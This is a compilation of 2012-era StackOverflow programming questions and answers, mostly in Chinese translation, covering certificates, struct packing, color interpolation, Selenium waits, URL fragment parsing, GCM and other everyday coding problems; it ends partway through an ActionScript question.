# StackOverflow 问答 11736000-11736999

# java - 将 PEM 证书或 Java 证书转换为 ASN1 证书

> ID：11736002
> 
> 赞同：1
> 
> 时间：2012-07-31T08:26:15.240
> 
> 标签：java, x509certificate, bouncycastle, asn.1, cmp

我在 PEM 文件中有一个证书。

我想`CMPCertificate`从这个文件构造一个。所以我必须建立一个`org.bouncycastle.asn1.x509.Certificate`才能调用`CMPCertificate.getInstance(..)`.

如何将 PEM 文件或 a 转换`java.security.cert.Certificate`为`org.bouncycastle.asn1.x509.Certificate`？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-15T21:06:41.243

在验证源代码后（因为该主题缺少文档），该`getInstance`方法`CMPCertificate`接受`byte[]`类型。

此代码应该可以工作：

```
java.security.cert.X09Certificate cert = generateCertFromPEM(/*...*/);
byte[] encoding = cert.getEncoded();
CMPCertificate cmpCert = CMPCertificate.getInstance(encoding); 
```

# python - Python -0.000000e+00 struct pack 返回错误值

> ID：11736003
> 
> 赞同：1
> 
> 时间：2012-07-31T08:26:17.493
> 
> 标签：python, data-conversion, python-2.4, struct.pack

嗨，我在 linux 上解析 -0.000000e+00 时遇到问题（在 windows 上工作）。

```
struct.pack( "d", -0.000000e+00 ) 
```

在 linux struct.pack 上，将 -0.000000e+00 更改为 0.000000e+00。当我在pack之前打印值是正确的但struct.pack的结果就像是0.000000e + 00。

有没有办法解决这个问题。

我想我需要添加最接近 0 的负数。怎么做？

编辑 `struct.pack( "d", -0.000000e+00 )`结果'\x00\x00\x00\x00\x00\x00\x00\x80'

`struct.pack( "!d", -0.000000e+00 )`结果'\x00\x00\x00\x00\x00\x00\x00\x00'

`struct.pack( "<d", -0.000000e+00 )`结果'\x00\x00\x00\x00\x00\x00\x00\x00'

`struct.pack( ">d", -0.000000e+00 )`结果 '\x00\x00\x00\x00\x00\x00\x00\x00' 我想使用“< d”和“> d”。

编辑 Sry 没有错误。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:41:40.397

struct 格式字符串`"d"`以特定于平台的方式对值进行编码。最有可能的是，您解码字节串的平台具有不同的[字节序](http://en.wikipedia.org/wiki/Endianess)或双精度数。使用`!`格式字符强制平台无关的编码：

```
>>> struct.pack('!d', -0.)
b'\x80\x00\x00\x00\x00\x00\x00\x00' # IEEE754 binary64 Big Endian
>>> struct.unpack('!d', b'\x80\x00\x00\x00\x00\x00\x00\x00')[0]
-0.0 
```

还要确保您使用受支持的 Python 版本。在 cPython<2.5 中，已知 struct 有问题。更新到当前版本，例如 2.7 或 3.2。

# javascript - 加权平均颜色混合

> ID：11736009
> 
> 赞同：1
> 
> 时间：2012-07-31T08:26:46.603
> 
> 标签：javascript, colors

我想做一个进度条类型的东西，当它在屏幕上移动时，它会从绿-橙-红开始。例如：

![在此处输入图像描述](../Images/4a979c5e7e71907c07b294f9c9bd1115.png)

如何找到给定点的颜色应该是什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-31T08:39:36.093

**编辑**：这是一个实现这个的 jsfiddle 的链接：http: [//jsfiddle.net/EAM9a/](http://jsfiddle.net/EAM9a/)

对于最简单的方法，您可以在颜色之间进行线性插值。让我们假设进度从 0.0 到 1.0 以使事情变得容易。所以

```
0.0 - green  - rgb(0,   100, 0)
0.5 - orange - rgb(255, 165, 0)
1.0 - red    - rgb(139,   0, 0) 
```

然后我们可以在绿色和橙色之间或橙色和红色之间进行插值，具体取决于我们想要的颜色。

```
var  green = [0, 100, 0],
    orange = [255, 165, 0],
       red = [139, 0, 0];

function color(val) {
  if (val < 0.5) {
    return colorToString(interpolate(val * 2, green, orange));
  } else {
    return colorToString(interpolate((val-0.5) * 2, orange, red));
  }
}

// val should be in the range [0.0, 1.0]
// rgb1 and rgb2 should be an array of 3 values each in the range [0, 255]
function interpolate(val, rgb1, rgb2) {
  var rgb = [0,0,0];
  var i;
  for (i = 0; i < 3; i++) {
    rgb[i] = rgb1[i] * (1.0 - val) + rgb2[i] * val;
  }
  return rgb;
}

// quick helper function to convert the array into something we can use for css
function colorToString(rgb) {
  return "rgb(" + rgb[0] + ", " + rgb[1] + ", " + rgb[2] + ")";
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T11:01:41.977

我为您创建了自己的颜色查找器：

它接受开始和结束色调、位置数和当前位置，并返回 CSS 颜色值。

[看到它在小提琴中工作](http://jsfiddle.net/jJhvR/)！

```
function restrict(value, low, high) {
    return value < low ? low : (value > high ? high : value);
}
function interpolate(rangeLow, rangeHigh, inputLow, inputHigh, value) {
    return (value - inputLow) / (inputHigh - inputLow) * (rangeHigh - rangeLow) + rangeLow;
}
function pad2(value) {
    return ('0' + value).substr(-2, 2);
}
function webColorFromRGB(color) {
    return '#' + pad2(color.R.toString(16)) + pad2(color.G.toString(16)) + pad2(color.B.toString(16));
}
function floatModulo(value, modulo) {
    return value - Math.floor(value / modulo) * modulo;
}
function webColorFromPosition(fromHue, toHue, positions, position) {
    var hue = interpolate(fromHue, toHue, 0, positions, position),
        RGB = {R: 0, G: 240, B: 120};
    for (var c in RGB) {
        if (!RGB.hasOwnProperty(c)) { continue; }
        RGB[c] = Math.round(interpolate(0, 255, 0, 360, restrict(Math.abs(floatModulo(hue + RGB[c], 360) * 6 - 1080) - 360, 0, 360)), 0);
    }
    return webColorFromRGB(RGB);
} 
```

特征：

*   接受从 0 到 360 的开始和结束色调。
*   结束可以低于开始。
*   如果想多次旋转色调，可以使用大于 360 的值

这是它的样子：

[![Erik 的自定义颜色查找器](../Images/4dfe2c45fc527c70fdc85efa5affb871.png)](http://jsfiddle.net/jJhvR/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-05T16:46:17.157

我对[@BenTaitelbaum](https://stackoverflow.com/users/437025/ben-taitelbaum)的[方法](https://stackoverflow.com/a/11736206/1250044)进行了一些更改：

```
var fill = $("#progressFill");

var rgb = [],
    red = [255, 0, 0],
    green = [0, 255, 0],
    yellow = [255, 255, 0];

function color(val) {
    if (val < 0.5) {
        return colorToString(interpolate(val * 2, green, yellow));
    } else {
        return colorToString(interpolate((val - 0.5) * 2, yellow, red));
    }
}

function interpolate(val, rgb1, rgb2) {
    for (var i = 0; i < 3; i++) {
        rgb[i] = Math.floor(rgb1[i] * (1.0 - val) + rgb2[i] * val);
    }
    return rgb;
}

// quick helper function to convert the array into something we can use for css
function colorToString(rgb) {
    return "rgb(" + rgb[0] + ", " + rgb[1] + ", " + rgb[2] + ")";
}

$(function () {
    $({progress: 0}).animate({progress: 1}, {
        duration: 4000,
        step: function (now, fx) {
            fill.css({
                width: (now * 100) + "%",
                backgroundColor: color(now)
            });
        }
    });
}); 
```

# javascript - 我的滑块没有工作自动模式

> ID：11736010
> 
> 赞同：2
> 
> 时间：2012-07-31T08:26:48.187
> 
> 标签：javascript, jquery, loops, accordion

我创建了简单的滑块手风琴，这是我的代码，这是唯一的问题，它适用于自动模式，并且可以工作

我的代码：

```
<style>

#ac_content
{
    width:900px;
    height:300px;
    margin:auto;
    background-color:#808080;
    overflow:hidden;
}

#ac_cols_float
{
    position:relative;
    float:left;

    line-width:70px;
    height:100%;
    background-color:#000000;
    margin-right:3px;
    cursor:hand;
    cursor:pointer;
}    

#ac_cols_float_infor
{
    position:relative;
    float:left;
    width4544:535px;
    height:100%;
    background-color:#ff0000;
}    

.rot-neg{
    margin-top:40px;
    margin-left:20px;
    font-size:20px;
    color:#FFFFFF;

    -moz-transform: rotate(90.0deg) translate(-40px,0px);  /* FF3.5+ */
    -moz-transform-origin: 0 100%;
    -o-transform: rotate(90.0deg) translate(-40px,0px);  /* Opera 10.5 */
    -o-transform-origin: 0 100%;
    -webkit-transform: rotate(90.0deg) translate(-40px,0px);  /* Saf3.1+, Chrome */
    -webkit-transform-origin: 0 100%;
    transform: rotate(90.0deg) translate(-40px,0px);  /* Saf3.1+, Chrome */
    transform-origin: 0 100%;
    filter: progid:DXImageTransform.Microsoft.BasicImage(rotation=1.0);  /* IE6,IE7 */
    -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=1.0)"; /* IE8 */
}    

#rote
{
    position:absolute;
}
</style>

<script>

var w="900";
var w_col="50";
var n_cols="5";
var margin=3*n_cols;

var result=w_col*n_cols+margin;

var final=w-result;

$(function(){    
    for (i=0;i<=5;i++)
    {       
        $(".ac_"+i+"").css("width",""+w_col);
    }
});

function acordeon(id)
{
    $(function(){
        $(".ac_"+id+"_inf").css("width",""+final);
        $(".ac_"+id+"_inf").show(2000).fadeIn(2000);
        for (i=0;i<5;i++)
        {           
            if (+id==i)
            {

            }
            else
            {
                $(".ac_"+i+"_inf").hide(1000);
            }
        }
    });
}
</script>

<script>

// AUTOMATIC MODE NO WORKS !!!

for (i=0;i<=5;i++)
{    
    setTimeout(function(){
        acordeon(i);
    },1000); 
}

</script>

<div id="ac_content">    
    <div id="ac_cols_float" class="ac_1" onclick="javascript:acordeon(1);"><div class="rot-neg">Web Design .....</div></div>
    <div id="ac_cols_float_infor" class="ac_1_inf" style="display:none;"></div>

    <div id="ac_cols_float" class="ac_2" onclick="javascript:acordeon(2);"></div>
    <div id="ac_cols_float_infor" class="ac_2_inf" style="display:none;"></div>

    <div id="ac_cols_float" class="ac_3" onclick="javascript:acordeon(3);"></div>
    <div id="ac_cols_float_infor" class="ac_3_inf" style="display:none;"></div>

    <div id="ac_cols_float" class="ac_4" onclick="javascript:acordeon(4);"></div>
    <div id="ac_cols_float_infor" class="ac_4_inf" style="display:none;"></div>

    <div id="ac_cols_float" class="ac_5" onclick="javascript:acordeon(5);"></div>
    <div id="ac_cols_float_infor" class="ac_5_inf" style="display:none;"></div>
</div> 
```

问题在于您可以看到 // 自动模式无效！，其他作品很好，很完美，感谢您的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:38:18.807

将自动 for 循环更改为

```
var starting_slide = 5;
function setSlide(i) {

  acordeon(i);

   if (i > 1) {
      i--;   
      setTimeout( function(){setSlide(i)}, 1000);
    }

   /* 
    //if dont want it to stop
    else {
      setTimeout( function(){setSlide(starting_slide)}, 1000);
   } */
}

​setSlide(starting_slide);​ 
```

因为您当前的 for 循环不会等待并同时执行这 5 个超时。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T08:40:19.883

似乎也有一些范围问题。我会将 acordeon 函数放在对象文字（命名空间-ish）中，以便您可以更好地控制它：

看看这个小提琴：http: [//jsfiddle.net/3mfJ2/](http://jsfiddle.net/3mfJ2/)

我改变的基本上是这样的：

```
myfuncs = {
    acordeon: function(id)
        {
            $(function(){
                $(".ac_"+id+"_inf").css("width",""+final);
                $(".ac_"+id+"_inf").show(2000).fadeIn(2000);
                for (i=0;i<5;i++)
                {           
                    if (+id==i)
                    {

                    }
                    else
                    {
                        $(".ac_"+i+"_inf").hide(1000);
                    }
                }
            });
        }
} 
```

# android - 如何访问浏览器插件的apk中的资源和资产？

> ID：11736012
> 
> 赞同：1
> 
> 时间：2012-07-31T08:26:50.337
> 
> 标签：android, android-ndk, npapi

我正在Android上编写浏览器插件。但是，我不知道如何访问插件 apk 中的资源和资产。

我试图在我的插件的 java 代码中打印出 R 和路径，但我从浏览器（而不是插件）得到了结果。

例如：

```
ApplicationInfo appInfo = context.getApplicationInfo();
Log.i("(test)", "path = " + appInfo.dataDir); 
```

它的输出是 /data/data/com.android.browser ，但我想访问路径： /data/data/com.test.myplugin 。

欢迎提出任何建议，并提前致谢。

PS：我已经跟踪了 development/samples/BrowserPlugin 的示例代码。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:41:14.267

对于您需要的资产： [AssetsManager](http://developer.android.com/reference/android/content/res/AssetManager.html)

对于资源： [关于 getResources()的问题](https://stackoverflow.com/questions/3886118/android-getresources-and-static)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T11:04:01.213

我找到了解决方案。根本原因是来自浏览器的这个上下文，所以它的资源和资产也来自浏览器。解决方案是使用包管理器访问原始插件的apk，然后我可以获得正确的资源和资产。

# django - Django 用户配置文件自动创建在管理站点上不起作用

> ID：11736019
> 
> 赞同：1
> 
> 时间：2012-07-31T08:27:33.960
> 
> 标签：django, instance

我认为这是 Django 管理的一个错误，当您在管理站点上添加一个用户并且您的模型上有一个自动创建配置文件时，站点崩溃，因为创建配置文件的实例存在问题：

```
def create_user_profile(sender, instance, created, **kwargs) :

    if created :
        data = Profile.objects.get_or_create(user = instance)
        profile = data[0]

        # Initialisation du profil
        profile.user = instance
        profile.credits = 0
        profile.score = 0

        profile.save()

post_save.connect(create_user_profile, sender = User,
                  dispatch_uid='create_user_profile') 
```

在管理站点上，实例不是用户，实例是管理员用户。

解决方案是在管理站点上创建用户时删除此代码，另一种解决方案呢？这很烦人……

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T08:44:32.053

尝试注释掉该行`profile.user = instance`。创建或检索的配置文件对象已具有由 设置的用户`get_or_create`。

# python - 在 /test 文件夹下使用 py.test 运行时出现“TypeError：‘模块’对象不可调用”

> ID：11736020
> 
> 赞同：4
> 
> 时间：2012-07-31T08:27:41.497
> 
> 标签：python, pytest

我有一个班级`Foo`住在`Src/Projects/SomeProject/Foo.py`

我有一堂课`FooTest(unittest.TestCase)`，住在：

```
Src/Projects/SomeProject/tests/FooTest.py 
```

当我用 pytest 运行它时（我只是在 Src 中输入“py.test”来运行所有测试），我得到：

```
 def setUp(self):
     self.foo = Foo()
     TypeError: 'module' object is not callable 
```

（我有并且`from Foo import Foo`在.`FooTest.py``Foo.py``sys.path`

但是当我用 python 运行它时：`python Src/Projects/SomeProject/tests/FooTest.py`一切正常。）

此外，如果我只是将 FooTest.py 移动到`Src/Projects/SomeProject`然后使用 py.test 运行会突然起作用。

有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T08:37:06.307

你需要检查你的 python 路径；`Foo.Foo`在你的模块之前发现了一些其他的`Foo`。

或者，在`try`/ `except TypeError`suite 中，打印出问题模块的路径：

```
def setUp(self):
    try:
        self.foo = Foo()
    except TypeError:
        # What module Foo is this?
        print Foo.__file__
        raise 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2018-01-29T09:46:36.067

我使用相同的命名约定，我遇到了同样的问题。我通过调用 self.foo = Foo.Foo() 实例化对象 Foo 来解决

# c# - C#如何检测是否有'/'字符？

> ID：11736021
> 
> 赞同：-5
> 
> 时间：2012-07-31T08:27:45.977
> 
> 标签：c#

我在一个字符串中有来自串行端口的三个 IP 地址。例如，字符串就像`192.168.1.1/192.168.1.12/192.168.1.118`. 我们如何检测'/'字符，以便我们可以将这个字符串分成3个IP地址字符串，并将每个字符串放入IP1字符串，IP2字符串和IP3字符串？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T08:28:43.983

`var res = "192.168.1.1/192.168.1.12/192.168.1.118".Split('/');`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T08:32:10.130

最好的方法是这样做：

```
string sRaw = "192.168.1.1/192.168.1.12/192.168.1.118";
string[] sParts = new string[]{};

if(sRaw.Contains('/')){
  sParts = sRaw.Split('/');
} 
```

但是不要忘记使用 IPAddress 来验证 IP。 [http://msdn.microsoft.com/en-us/library/system.net.ipaddress.aspx](http://msdn.microsoft.com/en-us/library/system.net.ipaddress.aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T08:29:05.070

请使用`String.Split('/')`方法

例子：

```
var text = "192.168.1.1/192.168.1.12/192.168.1.118".Split('/'); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-31T08:30:19.783

```
string sData = "192.168.1.1/192.168.1.12/192.168.1.118";
string[] sIps = null;

if (sData.Contains('/'))
    sIps = sData.split('/');

// sIps[i] contains your data 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-31T08:33:20.180

您可以添加 StringSplitOptions.RemoveEmptyEntries 以避免因输入数据中的重复/拖尾斜杠而导致空项目。

```
var data = "192.168.1.1/192.168.1.12/192.168.1.118";
var result = data.Split('/', StringSplitOptions.RemoveEmptyEntries); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-07-31T08:33:26.393

```
string arrStr = "192.168.1.1/192.168.1.12/192.168.1.118";
char[] separator = new char[] { '/' };
string[] strSplitArr = arrStr.Split(separator);

string IP1 = strSplitArr[0];
string IP2 = strSplitArr[1];
string IP3 = strSplitArr[2]; 
```

# java - WebDriver - wait for element using Java

> ID：11736027
> 
> 赞同：84
> 
> 时间：2012-07-31T08:28:10.707
> 
> 标签：java, webdriver, selenium-webdriver

I'm looking for something similar to `waitForElementPresent` to check whether element is displayed before I click it. I thought this can be done by `implicitWait`, so I used the following:

```
driver.manage().timeouts().implicitlyWait(5, TimeUnit.SECONDS); 
```

and then click by

```
driver.findElement(By.id(prop.getProperty(vName))).click(); 
```

Unfortunately, sometimes it waits for the element and sometimes not. I looked for a while and found this solution :

```
for (int second = 0;; second++) {
    Thread.sleep(sleepTime);
    if (second >= 10)
        fail("timeout : " + vName);
    try {
        if (driver.findElement(By.id(prop.getProperty(vName))).isDisplayed())
            break;
    } catch (Exception e) {
        writeToExcel("data.xls", e.toString(), parameters.currentTestRow, 46);
    }
}
driver.findElement(By.id(prop.getProperty(vName))).click(); 
```

And it waited all right, but before timing out it had to wait 10 times 5, 50 seconds. A bit much. So I set the implicitly wait to 1sec and all seemed fine until now. Because now some things wait 10s before timeout but some other things time out after 1s.

How do you cover the waiting for element present/visible in your code? Any hint is appreciable.

* * *

## 回答 #1

> 赞同：166
> 
> 时间：2012-07-31T10:55:38.827

This is how I do it in my code.

```
WebDriverWait wait = new WebDriverWait(webDriver, timeoutInSeconds);
wait.until(ExpectedConditions.visibilityOfElementLocated(By.id<locator>)); 
```

or

```
wait.until(ExpectedConditions.elementToBeClickable(By.id<locator>)); 
```

to be precise.

See also:

*   [org.openqa.selenium.support.ui.ExpectedConditions](https://seleniumhq.github.io/selenium/docs/api/java/org/openqa/selenium/support/ui/ExpectedConditions.html) for similar shortcuts for various wait scenarios.
*   [org.openqa.selenium.support.ui.WebDriverWait](https://seleniumhq.github.io/selenium/docs/api/java/org/openqa/selenium/support/ui/WebDriverWait.html) for its various constructors.

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2016-10-25T13:02:31.367

You can use Explicit wait or Fluent Wait

Example of Explicit Wait -

```
WebDriverWait wait = new WebDriverWait(WebDriverRefrence,20);
WebElement aboutMe;
aboutMe= wait.until(ExpectedConditions.visibilityOfElementLocated(By.id("about_me"))); 
```

Example of Fluent Wait -

```
Wait<WebDriver> wait = new FluentWait<WebDriver>(driver)                            
.withTimeout(20, TimeUnit.SECONDS)          
.pollingEvery(5, TimeUnit.SECONDS)          
.ignoring(NoSuchElementException.class);    

  WebElement aboutMe= wait.until(new Function<WebDriver, WebElement>() {       
public WebElement apply(WebDriver driver) { 
return driver.findElement(By.id("about_me"));     
 }  
}); 
```

Check this [TUTORIAL](http://www.qaautomated.com/2016/10/implicit-wait-explicit-wait-and-fluent.html) for more details.

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2017-07-24T07:20:47.940

We're having a lot of race conditions with `elementToBeClickable`. See [https://github.com/angular/protractor/issues/2313](https://github.com/angular/protractor/issues/2313). Something along these lines worked reasonably well even if a little brute force

```
Awaitility.await()
        .atMost(timeout)
        .ignoreException(NoSuchElementException.class)
        .ignoreExceptionsMatching(
            Matchers.allOf(
                Matchers.instanceOf(WebDriverException.class),
                Matchers.hasProperty(
                    "message",
                    Matchers.containsString("is not clickable at point")
                )
            )
        ).until(
            () -> {
                this.driver.findElement(locator).click();
                return true;
            },
            Matchers.is(true)
        ); 
```

* * *

## 回答 #4

> 赞同：-5
> 
> 时间：2014-10-27T04:14:21.347

Above wait statement is a nice example of Explicit wait.

As Explicit waits are intelligent waits that are confined to a particular web element(as mentioned in above x-path).

By Using explicit waits you are basically telling WebDriver at the max it is to wait for X units(whatever you have given as timeoutInSeconds) of time before it gives up.

# ios - 使用界面生成器添加的底栏不显示

> ID：11736028
> 
> 赞同：0
> 
> 时间：2012-07-31T08:28:12.207
> 
> 标签：ios, interface-builder

我不会在 iPad 视图中添加底部工具栏。虽然我用界面生成器添加它......

![在此处输入图像描述](../Images/be5909265ef5d0136f8e9ff286e64a66.png)

![在此处输入图像描述](../Images/254f866b0d9ea0b266eaa39f2d4797e5.png)

...我无法在我的应用程序中将其可视化。将栏添加到底部的唯一方法是从库中拖动工具栏。你能解释一下为什么吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-20T15:46:17.067

如果您查看属性检查器，您会看到您显示的下拉列表位于“模拟指标”部分。更改这些选项实际上不会更改布局，它们只是用来帮助您可视化如果它们存在时布局的外观。

之所以这样，是因为有些项目（比如顶部的导航栏）是根据情况自动添加的，在界面构建器中自己添加会出现问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:43:48.477

您是否确保视图已连接到界面构建器中的正确视图控制器？应该有一个选项卡允许您指定自定义类。如果你给你的 CustomView.m 文件的名称，那么两者应该连接并且应该显示栏。我希望这是有道理的，但是这里有点晚了，我有点累了。

# php - 如何使用哈希提取 URL 参数？

> ID：11736030
> 
> 赞同：1
> 
> 时间：2012-07-31T08:28:15.413
> 
> 标签：php, javascript, url, parameters

> **可能重复：**
> [为什么 URL 的哈希部分不在服务器端？](https://stackoverflow.com/questions/3664257/why-the-hash-part-of-the-url-is-not-in-the-server-side)

我有一个网址[http://www.example.com/edit-your-profile/#file%5B0%5D%5Bstatus%5D=Complete&file%5B0%5D%5BremoteFileURL%5D=http%3A%2F%2Fi.imgur .com%2Fe0XJI.jpg&file%5B0%5D%5BfileSource%5D=Previous%20Uploads&file%5B0%5D%5BpicID%5D=p43](http://www.example.com/edit-your-profile/#file%5B0%5D%5Bstatus%5D=Complete&file%5B0%5D%5BremoteFileURL%5D=http%3A%2F%2Fi.imgur.com%2Fe0XJI.jpg&file%5B0%5D%5BfileSource%5D=Previous%20Uploads&file%5B0%5D%5BpicID%5D=p43)

**我需要在页面上回显或显示“remoteFileURL”参数作为输入字段的值**，看来我不能用 PHP 做到这一点（据我所知）。我不太了解js，任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T08:40:06.383

简化 - 不是美丽......只是为了展示一种可能性并为您指明正确的方向。退货`http://i.imgur.com/e0XJI.jpg`

```
<?php
$url = 'http://www.example.com/edit-your-profile/#file%5B0%5D%5Bstatus%5D=Complete&file%5B0%5D%5BremoteFileURL%5D=http%3A%2F%2Fi.imgur.com%2Fe0XJI.jpg&file%5B0%5D%5BfileSource%5D=Previous%20Uploads&file%5B0%5D%5BpicID%5D=p43';
$urlDecoded = urldecode($url);
$urlParts = parse_url($urlDecoded);

$matches = array();
$regexRemoteUrl = preg_match('/remoteFileUrl\]=([^&]+)/i', $urlParts['fragment'], $matches);
// remoteFileURL
echo($matches[1]);
?> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T08:31:45.750

您可以使用正则表达式搜索与“remoteFileUrl”后跟一些字符匹配的任何内容......然后在每个＆符号处拆分字符串......然后简单地将该文本字符串回显到您的输入字段中。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T08:37:41.803

如果你想在 Javascript 中使用它，这里有一个简单的正则表达式可以为你得到它：

```
decodeURI(window.location.hash).match(/remoteFileURL]=([^&]+)/)[1] 
```

它`"http%3A%2F%2Fi.imgur.com%2Fe0XJI.jpg"`为我返回

所以我们使用`unescape`：

```
unescape(decodeURI(window.location.hash).match(/remoteFileURL]=([^&]+)/)[1]) 
```

要得到`"http://i.imgur.com/e0XJI.jpg"`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-31T08:45:32.313

这是您可以在 JavaScript 或 php 中使用的正则表达式：

```
(?:file%5B0%5D%5BremoteFileURL%5D|remoteFileURL)=(.+?)& 
```

由于您的示例 URL 具有一种非常奇怪的参数命名形式，因此我将这种形式和通常的方式都包括在内。它匹配`file[0][remoteFile]`以及`remoteFile`捕获该参数的值。

在 JavaScript 中，如果有一个包含带有 id 的 URL 的字段，您可以这样做`URL`。

```
var url = document.getElementById('URL').value;
var myRegexp = /(?:file%5B0%5D%5BremoteFileURL%5D|remoteFileURL)=(.+?)\&/;
var match = myRegexp.exec(url);
alert(match[1]); 
```

*   在[Rubular](http://rubular.com/r/XIa9myZVbj)进行测试。
*   [在jsFiddle](http://jsfiddle.net/VQcVm/)尝试一下。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-31T08:41:53.357

```
var decodedUri = decodeURIComponent('http%3A%2F%2Fdtzhqpwfdzscm.cloudfront.net%2F4ca06373624db.jpg'); 
```

您可以使用此功能从 url 中提取您需要的参数。

```
function getURLParameter(name,url) {
    return decodeURI(
        (RegExp(name + '=' + '(.+?)(&|$)').exec(decodedUri)||[,null])[1]
    );
} 
```

调用函数如下

```
 var fileUrl = getURLParameter("remoteFileURL",decodedUri); 
```

:)

# java - GCM 未唤醒设备

> ID：11736038
> 
> 赞同：12
> 
> 时间：2012-07-31T08:28:56.803
> 
> 标签：java, android, google-cloud-messaging

我开发了一个 GCM 应用程序。当设备不空闲时一切正常（即通过按下电源按钮进入睡眠状态）。但是，当我在设备空闲时发送消息时，设备不会唤醒。

我做了以下事情：

1.  已验证在服务器应用程序中 delay_while_idle 未设置为 true
2.  为每条消息使用不同的折叠键
3.  多次重启设备
4.  尝试从服务器端完全省略 delay_while_idle - 它没有效果

我的目标是 Android 2.2 api level 8（最低版本），在运行 Android 2.3.6 的实际设备上进行测试

设备正在使用 wi-fi，没有 sim 卡 - 但在运行时可以正常接收消息，而不是空闲。

这是客户端清单权限部分：

```
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.GET_ACCOUNTS" />
<uses-permission android:name="android.permission.WAKE_LOCK" />
<permission
    android:name="com.tranwall.sdk.device.android.permission.C2D_MESSAGE"
android:protectionLevel="signature" />
<uses-permission android:name="basePackage.android.permission.C2D_MESSAGE" />
<uses-permission android:name="com.google.android.c2dm.permission.RECEIVE"  />           
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />    
<uses-permission android:name="android.permission.RECEIVE_SMS" />
<uses-permission android:name="android.permission.INTERNET" /> 
```

提前感谢您的帮助

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-31T09:02:41.850

仅在清单文件中出现问题。确保以下是清单文件 GCM 的内容

```
<permission
    android:name="packagename.permission.C2D_MESSAGE"
    android:protectionLevel="signature" />

<uses-permission android:name="packagename.permission.C2D_MESSAGE" />
<uses-permission android:name="com.google.android.c2dm.permission.RECEIVE" />
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.WAKE_LOCK" />

<application>
    <receiver 
        android:name="com.google.android.gcm.GCMBroadcastReceiver"
        android:permission="com.google.android.c2dm.permission.SEND" >
        <intent-filter>
            <action android:name="com.google.android.c2dm.intent.RECEIVE" />
            <action android:name="com.google.android.c2dm.intent.REGISTRATION" />
            <category android:name="packagename" />
        </intent-filter>
     </receiver>
     <service android:name=".GCMIntentService" android:enabled="true" />
</application> 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-04T06:23:13.200

`delayWhileIdle=false`

delay_while_idle ：如果包含，表示如果设备空闲，则不应立即发送消息。
服务器将等待设备激活，然后只发送每个 *collapse_key* 值的最后一条消息。选修的。默认值为 false，并且必须是`JSON`布尔值。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-07-12T09:01:39.093

服务器端需要这段代码；

```
 builder.delayWhileIdle(false); 
```

这意味着深度睡眠时没有唤醒电话。但收到消息。

然后当唤醒用户电话时，为 GCMIntentService 生成新的意图。

# iphone - 在另一个图像中绘制图像在 iOS 设备上不起作用

> ID：11736041
> 
> 赞同：0
> 
> 时间：2012-07-31T08:29:00.490
> 
> 标签：iphone, objective-c, ios, uiimage

我需要您的帮助才能在 iOS 上的另一个图像中绘制图像。此刻，我使用下面的代码：

```
UIImage* finalimage = [self drawImage:ECAImage inImage:finalimage atPoint:ECALocation]; 
```

我的功能：

```
-(UIImage*) drawImage:(UIImage*) fgImage inImage:(UIImage*) bgImage atPoint:(CGPoint)  point
{
    UIGraphicsBeginImageContextWithOptions(bgImage.size, FALSE, 0.0);
    [bgImage drawInRect:CGRectMake( 0, 0, bgImage.size.width, bgImage.size.height)];
    [fgImage drawInRect:CGRectMake( point.x, point.y, fgImage.size.width, fgImage.size.height)];
    UIImage *newImage = UIGraphicsGetImageFromCurrentImageContext();
    UIGraphicsEndImageContext();

    return newImage;
} 
```

此代码适用于 iPhone 5.0 模拟器，但不适用于我的设备 iPhone 5.0.1。我可以显示 bgImage 但 fgImage 没有绘制。有任何想法吗 ？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T09:18:40.303

检查您的前景图像是否正在加载。我在使用 sim 时遇到了问题，因为它仅在底层文件系统区分大小写时才区分大小写，因此对于大多数人来说，它可以容忍文件名中的大小写不匹配，而设备始终区分大小写。

[旁白] 我现在运行一个区分大小写的文件系统。这给了我提交到应用商店的巨大问题，但那是另一回事了......

# function - Function's parameter variable as object

> ID：11736046
> 
> 赞同：0
> 
> 时间：2012-07-31T08:29:11.843
> 
> 标签：function, variables, parameters, actionscript-2

Is there a way / I would like to know how to use a variable dynamically. My idea is to have a movieclip calling a function at the same time passing a parameter. The parameter value will then be pass to the function for more script.

**How to make use of the function's parameter variable, use its value to execute as instanceName.method with in the function?**

Sample Code, I have two movieclip with instance names, box1 and box2. once, any of the movieclip is press, the function will execute.

```
// movieClip, instance name : box1
on(press){
    _root.functionName(this._name);
}
